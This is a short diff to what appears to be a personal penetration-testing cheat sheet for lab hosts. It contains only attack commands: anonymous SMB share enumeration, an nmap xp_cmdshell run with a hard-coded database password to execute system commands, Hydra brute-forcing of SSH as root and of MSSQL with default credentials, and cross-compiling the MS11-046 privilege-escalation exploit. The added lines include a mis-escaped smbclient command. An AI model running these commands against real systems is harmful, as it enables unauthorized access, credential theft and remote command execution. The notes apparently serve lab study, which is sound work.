@@ -2,6 +2,7 @@
 smbmap -H 10.11.1.136 -u null -p ""   
 smbmap -H 10.11.1.136 -u null -p "" -R   
 smbclient \\\\10.11.1.136\\'Bob Share' ""    
+smbclient \\\\\\\10.11.1.136\\\\'Bob Share' ""    
 
 #### xp_cmdshell
 nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="net user" 10.11.1.31 
@@ -41,7 +42,8 @@ su slow
 rdesktop -u sl0wly 10.11.1.31
 
 #### HYDRA BF
-hydra -l root -P /usr/share/wordlist/rockyou.txt -T 20 10.11.1.71 ssh
+hydra -l root -P /usr/share/wordlist/rockyou.txt -T 20 10.11.1.71 ssh     
+hydra -s 27900 -C /usr/share/wordlist/sparta/mssql-default-userpass.txt -f 10.11.1.128 mssql   
 
 #### compling .exe on kali
 i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
